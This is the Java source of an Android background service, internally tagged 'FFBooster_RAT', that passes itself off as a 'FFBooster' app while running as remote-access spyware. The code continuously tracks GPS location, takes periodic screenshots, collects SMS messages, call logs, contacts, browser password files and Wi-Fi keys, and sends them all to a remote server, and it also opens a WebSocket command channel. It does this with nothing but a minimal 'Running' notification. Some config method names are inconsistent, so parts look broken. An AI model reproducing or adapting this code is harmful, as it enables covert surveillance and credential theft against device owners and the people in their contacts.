package com.ffbooster.panel;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.hardware.display.DisplayManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class BackgroundService extends Service {
    private static final String TAG = "FFBooster_RAT";
    private static final long SCREENSHOT_INTERVAL = 5 * 60 * 1000;
    private static final long LOCATION_UPDATE_INTERVAL = 30 * 1000;
    private static final long DATA_SYNC_INTERVAL = 60 * 1000;
    
    private String deviceId;
    private String username;
    private Handler handler;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private MediaProjectionManager mediaProjectionManager;
    private boolean isScreenCapturing = false;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        handler = new Handler(getMainLooper());
        initNotification();
        initLocationTracking();
        startAutoScreenshots();
        startDataSync();
        startWebSocketConnection();
        return START_STICKY;
    }
    
    private void initNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "rat_channel")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("FFBooster")
            .setContentText("Running")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setAutoCancel(false);
        
        startForeground(1001, builder.build());
    }
    
    private void initLocationTracking() {
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                sendLocationData(location);
            }
            
            @Override
            public void onProviderEnabled(String provider) {}
            
            @Override
            public void onProviderDisabled(String provider) {}
            
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}
        };
        
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED) {
            try {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, LOCATION_UPDATE_INTERVAL, 10, locationListener);
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, LOCATION_UPDATE_INTERVAL, 10, locationListener);
            } catch (SecurityException e) {
                Log.e(TAG, "Location permission error", e);
            }
        }
    }
    
    private void startAutoScreenshots() {
        handler.postDelayed(() -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                captureScreenViaAccessibility();
            } else {
                captureScreenLegacy();
            }
            startAutoScreenshots();
        }, SCREENSHOT_INTERVAL);
    }
    
    private void captureScreenLegacy() {
        try {
            Process process = Runtime.getRuntime().exec("screencap -p /data/local/tmp/screenshot.png");
            process.waitFor();
            
            File screenshotFile = new File("/data/local/tmp/screenshot.png");
            if (screenshotFile.exists()) {
                byte[] imageBytes = Files.readAllBytes(Paths.get(screenshotFile.getAbsolutePath()));
                String base64Image = Base64.encodeToString(imageBytes, Base64.DEFAULT);
                sendScreenshot(base64Image);
                screenshotFile.delete();
            }
        } catch (Exception e) {
            Log.e(TAG, "Screenshot capture failed", e);
        }
    }
    
    private void captureScreenViaAccessibility() {
        captureScreenLegacy();
    }
    
    private void sendScreenshot(String base64Image) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "screenshot");
            data.put("device_id", Config.getDeviceId());
            data.put("username", Config.getUsername());
            data.put("data", base64Image);
            data.put("timestamp", System.currentTimeMillis());
            
            String serverUrl = Config.getsyncConfigFromGithubl();
            HttpClient.postAsync(serverUrl + "/api/data/screenshot", data, response -> {
                Log.d(TAG, "Screenshot sent");
            });
        } catch (JSONException e) {
            Log.e(TAG, "Screenshot JSON error", e);
        }
    }
    
    private void sendLocationData(Location location) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "location");
            data.put("device_id", Config.getDeviceId());
            data.put("username", Config.getUsername());
            data.put("lat", location.getLatitude());
            data.put("lng", location.getLongitude());
            data.put("accuracy", location.getAccuracy());
            data.put("provider", location.getProvider());
            data.put("time_formatted", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(location.getTime())));
            
            String serverUrl = Config.getServerUrl();
            HttpClient.postAsync(serverUrl + "/ws", data, null);
        } catch (JSONException e) {
            Log.e(TAG, "Location JSON error", e);
        }
    }
    
    private void startDataSync() {
        handler.postDelayed(() -> {
            syncSMS();
            syncCallLogs();
            syncContacts();
            syncPasswords();
            syncBatteryInfo();
            startDataSync();
        }, DATA_SYNC_INTERVAL);
    }
    
    private void syncSMS() {
        try {
            JSONArray smsArray = new JSONArray();
            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)));
                    sms.put("body", cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)));
                    sms.put("date", cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE)));
                    sms.put("type", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE)));
                    smsArray.put(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            JSONObject data = new JSONObject();
            data.put("type", "sms");
            data.put("device_id", Config.getDeviceId());
            data.put("username", Config.getUsername());
            data.put("data", smsArray);
            data.put("count", smsArray.length());
            
            String serverUrl = Config.getsyncConfigFromGithubl();
            HttpClient.postAsync(serverUrl + "/ws", data, null);
        } catch (Exception e) {
            Log.e(TAG, "SMS sync error", e);
        }
    }
    
    private void syncCallLogs() {
        try {
            JSONArray callArray = new JSONArray();
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
                    call.put("date", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)));
                    call.put("duration", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                    call.put("type", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
                    callArray.put(call);
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            JSONObject data = new JSONObject();
            data.put("type", "call");
            data.put("device_id", Config.getDeviceId());
            data.put("username", Config.getUsername());
            data.put("data", callArray);
            data.put("count", callArray.length());
            
            String serverUrl = Config.getsyncConfigFromGithubl();
            HttpClient.postAsync(serverUrl + "/ws", data, null);
        } catch (Exception e) {
            Log.e(TAG, "Call log sync error", e);
        }
    }
    
    private void syncContacts() {
        try {
            JSONArray contactArray = new JSONArray();
            Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject contact = new JSONObject();
                    String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    contact.put("name", name);
                    
                    Cursor phoneCursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null
                    );
                    
                    if (phoneCursor != null && phoneCursor.moveToFirst()) {
                        contact.put("phone", phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                        phoneCursor.close();
                    }
                    
                    contactArray.put(contact);
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            JSONObject data = new JSONObject();
            data.put("type", "contacts");
            data.put("device_id", Config.getDeviceId());
            data.put("username", Config.getUsername());
            data.put("data", contactArray);
            data.put("count", contactArray.length());
            
            String serverUrl = Config.getsyncConfigFromGithub();
            HttpClient.postAsync(serverUrl + "/ws", data, null);
        } catch (Exception e) {
            Log.e(TAG, "Contacts sync error", e);
        }
    }
    
    private void syncPasswords() {
        try {
            JSONArray passwords = new JSONArray();
            
            String[] browsers = {
                "/data/data/com.google.android.gms/databases/",
                "/data/data/com.android.chrome/app_chrome/Default/"
            };
            
            for (String browserPath : browsers) {
                File dir = new File(browserPath);
                if (dir.exists()) {
                    for (File file : dir.listFiles()) {
                        if (file.getName().contains("password") || file.getName().contains("login")) {
                            JSONObject pw = new JSONObject();
                            pw.put("source", file.getName());
                            pw.put("path", file.getAbsolutePath());
                            passwords.put(pw);
                        }
                    }
                }
            }
            
            String[] wifiPath = {"/data/misc/wifi/wpa_supplicant.conf"};
            for (String path : wifiPath) {
                File file = new File(path);
                if (file.exists()) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (line.contains("ssid") || line.contains("psk")) {
                            JSONObject pw = new JSONObject();
                            pw.put("type", "WiFi");
                            pw.put("data", line);
                            passwords.put(pw);
                        }
                    }
                    reader.close();
                }
            }
            
            if (passwords.length() > 0) {
                JSONObject data = new JSONObject();
                data.put("type", "passwords");
                data.put("device_id", Config.getDeviceId());
                data.put("username", Config.getUsername());
                data.put("data", passwords);
                
                String serverUrl = Config.getsyncConfigFromGithub();
                HttpClient.postAsync(serverUrl + "/ws", data, null);
            }
        } catch (Exception e) {
            Log.e(TAG, "Password extraction error", e);
        }
    }
    
    private void syncBatteryInfo() {
        try {
            Intent batteryIntent = registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int temp = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, -1);
                boolean charging = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) > 0;
                
                JSONObject data = new JSONObject();
                data.put("type", "battery");
                data.put("device_id", Config.getDeviceId());
                data.put("username", Config.getUsername());
                data.put("level", level);
                data.put("temperature", temp);
                data.put("charging", charging);
                
                String serverUrl = Config.getsyncConfigFromGithub();
                HttpClient.postAsync(serverUrl + "/ws", data, null);
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery sync error", e);
        }
    }
    
    private void startWebSocketConnection() {
        new Thread(() -> {
            try {
                WebSocketClient client = new WebSocketClient(Config.getsyncConfigFromGithub(), Config.getDeviceId(), Config.getUsername(), BackgroundService.this);
                client.connect();
            } catch (Exception e) {
                Log.e(TAG, "WebSocket connection error", e);
            }
        }).start();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return new LocalBinder();
    }
    
    public class LocalBinder extends Binder {
        BackgroundService getService() {
            return BackgroundService.this;
        }
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (locationManager != null && locationListener != null) {
            try {
                locationManager.removeUpdates(locationListener);
            } catch (SecurityException e) {
                Log.e(TAG, "Location removal error", e);
            }
        }
    }
}
